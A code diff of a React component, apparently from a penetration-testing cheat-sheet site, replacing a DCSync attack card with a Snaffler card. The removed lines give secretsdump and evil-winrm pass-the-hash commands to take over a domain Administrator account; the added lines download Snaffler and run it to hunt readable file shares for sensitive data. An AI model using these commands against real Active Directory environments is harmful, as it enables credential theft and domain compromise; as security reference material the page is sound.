@@ -8,13 +8,12 @@ import {
 import Link from "next/link";
 import SyntaxHighlighter from "react-syntax-highlighter";
 import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
-import Image from "next/image";
 
 interface IProps {
   title: string;
 }
 
-const DCSyncAttack = ({ title }: IProps) => {
+const Snaffler = ({ title }: IProps) => {
   return (
     <>
       {" "}
@@ -34,32 +33,24 @@ const DCSyncAttack = ({ title }: IProps) => {
               color: "primary.main",
             }}
           >
-            <Box sx={{ m: 4 }} />
             <Typography variant="h6">Description</Typography>
             <Typography>
-              With GetChanges and GetChangesAll, we can perform a DCSync Attack.
-              A DCSync Attack uses commands in the Directory Replication Service
-              Remote Protocol (MS-DRSR), which is used by Domain Controllers to
-              replicate domain data. DCSync uses MS-DRSR to simulate the
-              behaviour of a domain controller and ask other domain controllers
-              to replicate information.
+              Snaffler is a tool used to enumerate Active Directory to find
+              sensitive information by going to all the computers in the Active
+              Directory and figuring out which ones have files shares, and
+              whether you can read them.
             </Typography>
-            <Image src="/DCSync.png" height={191} width={467} priority={true} />
             <Box sx={{ m: 4 }} />
             <Typography variant="h6">Step 1</Typography>
-            <Typography>
-              Use Secretsdump.py to get the Administrator's hash.
-            </Typography>
             <SyntaxHighlighter className="syntax" language="bash">
-              {"secretsdump.py {DOMAIN}/{USER}@{IP}"}
+              {
+                "wget https://github.com/SnaffCon/Snaffler/releases/download/1.0.54/Snaffler.exe"
+              }
             </SyntaxHighlighter>
             <Box sx={{ m: 4 }} />
             <Typography variant="h6">Step 2</Typography>
-            <Typography>
-              Perform a Pass-the-Hash attack to login as Administrator.
-            </Typography>
             <SyntaxHighlighter className="syntax" language="bash">
-              {"evil-winrm -H {NTLM_HASH} -u Administrator -i {IP}"}
+              {"Snaffler.exe -s -d {DOMAIN} -o snaffler.log -v data"}
             </SyntaxHighlighter>
           </Typography>
         </AccordionDetails>
@@ -68,4 +59,4 @@ const DCSyncAttack = ({ title }: IProps) => {
   );
 };
 
-export default DCSyncAttack;
+export default Snaffler;
